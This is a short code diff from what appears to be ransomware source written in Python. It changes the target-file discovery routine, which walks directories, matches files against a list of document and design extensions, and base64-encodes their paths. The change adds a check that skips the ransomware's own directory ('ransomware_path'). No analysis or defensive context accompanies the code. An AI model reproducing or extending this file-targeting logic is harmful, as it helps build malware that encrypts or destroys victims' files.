@@ -1,5 +1,6 @@
 import os
 import base64
+import variables
 
 # return the base64 encoded path of the files
 def find_files(path):
@@ -23,6 +24,9 @@ SXC': 0, '.OTS': 0, '.ODS': 0, '.3DM': 0, '.MAX': 0, '.3DS': 0, '.UOT': 0, '.STW
     
     f = []
     for actual_path, directories, files_found in os.walk(path):
+        if actual_path.startswith(variables.ransomware_path):
+            continue
+
         for arq in files_found:
             extensao = os.path.splitext(os.path.join(actual_path, arq))[1].upper()
             if(file_format.get(extensao) == 0 or extensao == ''):
